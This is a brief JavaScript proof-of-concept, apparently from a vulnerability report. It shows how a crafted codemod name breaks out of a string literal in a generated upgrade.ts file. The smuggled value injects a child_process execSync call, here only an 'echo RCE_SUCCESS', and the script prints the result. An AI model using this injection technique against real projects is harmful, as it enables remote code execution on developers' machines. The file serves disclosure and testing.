/**
 * PoC: scaffold-codemod code injection into upgrade.ts
 *
 * Simulates the vulnerable logic - codemodName breaks out of string,
 * injects require('child_process').execSync() into the bundle array.
 *
 * Run: node poc.js
 */

const fs = require('fs');
const path = require('path');

// Malicious codemodName breaks out of string, injects executable code
const maliciousName = "x']; require('child_process').execSync('echo RCE_SUCCESS'); var _='";

const newBundle = ['v4/remove-ai', maliciousName]
  .sort()
  .map(name => `  '${name}',`)
  .join('\n');

const content = `const bundle = [\n${newBundle}\n];`;

console.log('[PoC] scaffold injects codemodName into upgrade.ts. Malicious name:');
console.log(maliciousName);
console.log('');
console.log('[PoC] Generated upgrade.ts snippet:');
console.log(content);
console.log('');
console.log('[PoC] When this file is loaded, require() executes. Payload may need');
console.log('[PoC] tuning for valid syntax; injection vector is confirmed.');
